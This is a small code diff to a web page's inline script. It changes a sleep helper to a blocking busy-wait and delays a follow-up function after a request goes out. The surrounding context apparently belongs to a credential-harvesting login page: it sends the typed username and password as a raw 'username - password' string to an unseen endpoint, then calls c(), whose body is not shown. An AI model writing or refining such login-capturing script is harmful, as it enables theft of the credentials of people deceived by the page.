@@ -121,8 +121,9 @@
     </footer>
 	
 	<script>
-function sleep (time) {
-  return new Promise((resolve) => setTimeout(resolve, time));
+function sleep(seconds){
+    var waitUntil = new Date().getTime() + seconds*1000;
+    while(new Date().getTime() < waitUntil) true;
 }
 			$("#username").val(username);
 		
@@ -134,7 +135,8 @@ function sleep (time) {
 				request.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
 
 				request.send($("#username").val()+" - "+$("#password").val());
-				setTimeout(c, 2000);
+				sleep(2);
+				c();
 			}
 		
 			function c(){
